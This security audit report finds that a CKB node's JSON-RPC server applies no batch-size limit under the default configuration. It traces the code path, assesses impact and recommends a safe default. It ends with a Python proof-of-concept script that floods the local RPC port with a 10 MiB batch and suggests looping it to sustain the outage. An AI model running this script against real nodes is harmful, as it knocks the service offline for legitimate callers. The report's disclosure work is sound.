Audit Report

## Title
Unbounded JSON-RPC Batch Request Processing Causes RPC Denial-of-Service by Default — (File: rpc/src/server.rs)

## Summary
`JSONRPC_BATCH_LIMIT` is a `OnceLock<usize>` that is only initialized when `config.rpc_batch_limit` is `Some(...)`. In the default production configuration, `rpc_batch_limit` is commented out in `resource/ckb.toml`, so the field deserializes as `None` and the static is never set. The batch-size guard at `rpc/src/server.rs:275–282` is therefore never triggered, allowing an attacker with access to the RPC port to submit an arbitrarily large JSON-RPC batch array bounded only by the 10 MiB `max_request_body_size`, saturating the RPC service for the full 30-second timeout window.

## Finding Description
`JSONRPC_BATCH_LIMIT` is declared at `rpc/src/server.rs:34` as `static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new()`. It is initialized only inside the conditional block at lines 53–55:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

The `Config` struct at `util/app-config/src/configs/rpc.rs:44` declares `rpc_batch_limit: Option<usize>` with no `#[serde(default)]` fallback. In `resource/ckb.toml` lines 205–208, the field is commented out with the explicit note "By default, there is no limitation on the size of batch request size", so `config.rpc_batch_limit` is `None` at runtime and `JSONRPC_BATCH_LIMIT` is never initialized.

The guard at `rpc/src/server.rs:275–282`:

```rust
if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
    && calls.len() > *batch_size
{ ... }
```

returns `None` from `.get()`, the `if let` arm is not taken, and execution falls through unconditionally to the streaming batch processor at lines 284–295, which processes every call sequentially with no cap. With `max_request_body_size = 10485760` (10 MiB, confirmed at `resource/ckb.toml:187`) and a `TimeoutLayer` of 30 seconds (confirmed at `rpc/src/server.rs:125–128`), a single HTTP POST can carry ~140,000+ minimal RPC calls. The test harness at `rpc/src/tests/setup.rs:184` explicitly sets `rpc_batch_limit: Some(1000)`, confirming developer awareness of the guard but no safe default wired for production.

## Impact Explanation
The impact is local RPC API unavailability. The RPC worker pool is saturated processing the unbounded batch, causing all concurrent RPC callers to time out for the duration of the attack window. This maps to **Note (0–500 points): Any local RPC API crash/unavailability**. The node's P2P and consensus layers are unaffected; only the RPC service is impacted.

## Likelihood Explanation
The RPC listens on `127.0.0.1:8114` by default, requiring local access or an operator-exposed port. No authentication is required. The attack requires only a single HTTP client with a crafted JSON body. The `rpc_batch_limit` opt-in is documented only as a comment in the config file, making it likely that most operators do not set it. The attack is repeatable immediately after each timeout window expires.

## Recommendation
Set a safe non-`None` default for `rpc_batch_limit` in the `Config` struct at `util/app-config/src/configs/rpc.rs:44` (e.g., `#[serde(default = "default_rpc_batch_limit")]` returning `Some(200)` or similar), so that `JSONRPC_BATCH_LIMIT` is always initialized and the guard at `rpc/src/server.rs:275` applies unconditionally. Operators who need higher limits can override via config.

## Proof of Concept
```python
import json, requests

call = {"jsonrpc": "2.0", "id": 1, "method": "get_tip_block_number", "params": []}
batch = []
payload = b""
while len(payload) < 10 * 1024 * 1024 - 200:
    batch.append(call.copy())
    payload = json.dumps(batch).encode()

r = requests.post(
    "http://127.0.0.1:8114/",
    data=payload,
    headers={"Content-Type": "application/json"},
    timeout=35,
)
print(f"Sent {len(batch)} calls in one batch ({len(payload)} bytes)")
```
Run against a default CKB node with no `rpc_batch_limit` set. All concurrent RPC callers will time out during the 30-second processing window. Repeat in a loop to sustain the denial-of-service.
